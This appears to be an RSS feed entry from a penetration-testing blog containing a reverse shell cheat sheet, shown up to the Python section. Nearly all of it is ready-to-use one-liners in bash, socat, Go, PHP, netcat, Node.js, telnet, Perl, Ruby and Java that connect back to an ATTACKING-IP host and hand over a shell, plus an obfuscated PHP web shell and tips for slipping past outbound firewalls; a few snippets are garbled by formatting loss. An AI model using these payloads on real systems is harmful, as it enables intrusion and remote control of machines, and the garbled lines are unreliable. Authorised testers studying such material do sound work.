<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:content="http://purl.org/rss/1.0/modules/content/"
  xmlns:wfw="http://wellformedweb.org/CommentAPI/"
  xmlns:dc="http://purl.org/dc/elements/1.1/"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
  xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
  >
  <channel>
    <title xml:lang="en">Zeroday</title>
    <atom:link type="application/atom+xml" href="https://highon.coffee/feed.xml" rel="self"/>
    <link>https://highon.coffee/</link>
    <pubDate>Thu, 22 Dec 2022 11:05:12 +0000</pubDate>
    <lastBuildDate>Thu, 22 Dec 2022 11:05:12 +0000</lastBuildDate>
    <language>en-US</language>
    <description>Security Research and Penetration Testing Blog</description>
    <image>
      <description>Zeroday</description>
      <url>https://highon.coffee</url>
      <title>HighOn.Coffee</title>
      <link>https://highon.coffee/</link>
      <width>144</width>
      <height>73</height>
    </image>
    
      
        
        <item>
          <title>Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</title>
          <link>https://highon.coffee/blog/reverse-shell-cheat-sheet/</link>
          <pubDate>Sun, 27 Feb 2022 02:37:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Penetration Testing</category>
          
          <category>Reverse Shell</category>
          
          <category>shells</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/reverse-shell-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#setup-listening-netcat&quot; id=&quot;markdown-toc-setup-listening-netcat&quot;&gt;Setup Listening Netcat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#bash-reverse-shells&quot; id=&quot;markdown-toc-bash-reverse-shells&quot;&gt;Bash Reverse Shells&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#socat-reverse-shell&quot; id=&quot;markdown-toc-socat-reverse-shell&quot;&gt;socat Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#golang-reverse-shell&quot; id=&quot;markdown-toc-golang-reverse-shell&quot;&gt;Golang Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#php-reverse-shell&quot; id=&quot;markdown-toc-php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#netcat-reverse-shell&quot; id=&quot;markdown-toc-netcat-reverse-shell&quot;&gt;Netcat Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nodejs-reverse-shell&quot; id=&quot;markdown-toc-nodejs-reverse-shell&quot;&gt;Node.js Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#telnet-reverse-shell&quot; id=&quot;markdown-toc-telnet-reverse-shell&quot;&gt;Telnet Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#perl-reverse-shell&quot; id=&quot;markdown-toc-perl-reverse-shell&quot;&gt;Perl Reverse Shell&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#perl-windows-reverse-shell&quot; id=&quot;markdown-toc-perl-windows-reverse-shell&quot;&gt;Perl Windows Reverse Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ruby-reverse-shell&quot; id=&quot;markdown-toc-ruby-reverse-shell&quot;&gt;Ruby Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#java-reverse-shell&quot; id=&quot;markdown-toc-java-reverse-shell&quot;&gt;Java Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#python-reverse-shell&quot; id=&quot;markdown-toc-python-reverse-shell&quot;&gt;Python Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#gawk-reverse-shell&quot; id=&quot;markdown-toc-gawk-reverse-shell&quot;&gt;Gawk Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#kali-web-shells&quot; id=&quot;markdown-toc-kali-web-shells&quot;&gt;Kali Web Shells&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-php-web-shells&quot; id=&quot;markdown-toc-kali-php-web-shells&quot;&gt;Kali PHP Web Shells&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-perl-reverse-shell&quot; id=&quot;markdown-toc-kali-perl-reverse-shell&quot;&gt;Kali Perl Reverse Shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-cold-fusion-shell&quot; id=&quot;markdown-toc-kali-cold-fusion-shell&quot;&gt;Kali Cold Fusion Shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-asp-shell&quot; id=&quot;markdown-toc-kali-asp-shell&quot;&gt;Kali ASP Shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-aspx-shells&quot; id=&quot;markdown-toc-kali-aspx-shells&quot;&gt;Kali ASPX Shells&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kali-jsp-reverse-shell&quot; id=&quot;markdown-toc-kali-jsp-reverse-shell&quot;&gt;Kali JSP Reverse Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.&lt;/p&gt;

&lt;p&gt;Below are a collection of Windows and Linux &lt;strong&gt;reverse shells&lt;/strong&gt; that use commonly installed programming languages PHP, Python, Powershell, nc (Netcat), JSP, Java, Bash, PowerShell (PS). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.&lt;/p&gt;

&lt;p&gt;If you found this resource usefull you should also check out our &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;penetration testing tools&lt;/a&gt; cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.&lt;/p&gt;

&lt;p&gt;25/02/2022 - House keeping
17/09/2020 - Updated to add the reverse shells submitted via Twitter @JaneScott 
29/03/2015 - Original post date&lt;/p&gt;

&lt;h2 id=&quot;setup-listening-netcat&quot;&gt;Setup Listening Netcat&lt;/h2&gt;

&lt;p&gt;Your remote shell will need a listening netcat instance in order to connect back, a simple way to do this is using a cloud instance / VPS - Linode is a good choice as they give you a direct public IP so there is no NAT issues to worry about or debug, &lt;a href=&quot;https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42&quot; rel=&quot;nofollow&quot;&gt; you can use this link to get a $100 Linode voucher.&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Set your Netcat listening shell on an allowed port&lt;/h5&gt;
  &lt;p&gt;Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;To setup a listening netcat instance, enter the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;NAT requires a port forward&lt;/h5&gt;
  &lt;p&gt;If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ATTACKING-IP&lt;/strong&gt; is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).&lt;/p&gt;

&lt;h2 id=&quot;bash-reverse-shells&quot;&gt;Bash Reverse Shells&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash 0&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;0&amp;lt;&amp;amp;196&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;196&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/ATTACKING-IP/80&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sh &amp;lt;&amp;amp;196 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;196 2&amp;gt;&amp;amp;196&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/tcp/ATTACKING-IP/80
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &amp;lt;&amp;amp;5 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;  

&lt;span class=&quot;c&quot;&gt;# or:&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line 0&amp;lt;&amp;amp;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/ATTACKING-IP/80 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;socat-reverse-shell&quot;&gt;socat Reverse Shell&lt;/h2&gt;

&lt;p&gt;Source: @filip_dragovic&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;socat tcp:ip:port &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;'bash -i'&lt;/span&gt; ,pty,stderr,setsid,sigint,sane &amp;amp;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;golang-reverse-shell&quot;&gt;Golang Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-go&quot; data-lang=&quot;go&quot;&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;net&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tcp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1:1337&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Stdin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;//cmd.Run();}'&amp;gt;/tmp/sh.go&amp;amp;&amp;amp;go run /tmp/sh.go&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/h2&gt;

&lt;p&gt;A useful PHP reverse shell:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;ATTACKING-IP&quot;,80);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Assumes TCP uses file descriptor 3. If it doesn&lt;span class=&quot;s1&quot;&gt;'t work, try 4,5, or 6)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another PHP reverse shell (that was submitted via Twitter):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?php &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/&quot;&lt;/span&gt;ATTACKING IP&lt;span class=&quot;s2&quot;&gt;&quot;/443 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Base64 encoded by @0xInfection:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;netcat-reverse-shell&quot;&gt;Netcat Reverse Shell&lt;/h2&gt;

&lt;p&gt;Useful netcat reverse shell examples:&lt;/p&gt;

&lt;p&gt;Don't forget to start your listener, or you won't be catching any shells :) &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/sh ATTACKING-IP 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/bin/sh | nc ATTACKING-IP 80&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /tmp/p&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; /tmp/p p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nc ATTACKING-IP 4444 0/tmp/p&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A reverse shell submitted by &lt;a href=&quot;https://twitter.com/atul_hax&quot;&gt;@0xatul&lt;/a&gt; which works well for OpenBSD netcat rather than GNU nc:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/lol&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;nc ATTACKER-IP PORT 0&amp;lt;/tmp/lol | /bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1 | &lt;span class=&quot;nb&quot;&gt;tee&lt;/span&gt; /tmp/lol&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;nodejs-reverse-shell&quot;&gt;Node.js Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;require&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'child_process'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/80 0&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Source: @jobertabma via @JaneScott&lt;/p&gt;

&lt;h2 id=&quot;telnet-reverse-shell&quot;&gt;Telnet Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /tmp/p&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mknod&lt;/span&gt; /tmp/p p &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; telnet ATTACKING-IP 80 0/tmp/p&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Remember to listen on 443 on the attacking machine also.&lt;/p&gt;

&lt;h2 id=&quot;perl-reverse-shell&quot;&gt;Perl Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;nv&quot;&gt;perl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;perl-windows-reverse-shell&quot;&gt;Perl Windows Reverse Shell&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;nv&quot;&gt;perl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;MIO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$c=new IO::Socket::INET(PeerAddr,&quot;ATTACKING-IP:80&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;nv&quot;&gt;perl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;ruby-reverse-shell&quot;&gt;Ruby Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;ruby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsocket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'f=TCPSocket.open(&quot;ATTACKING-IP&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;java-reverse-shell&quot;&gt;Java Reverse Shell&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/ATTACKING-IP/80;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;python-reverse-shell&quot;&gt;Python Reverse Shell&lt;/h2&gt;

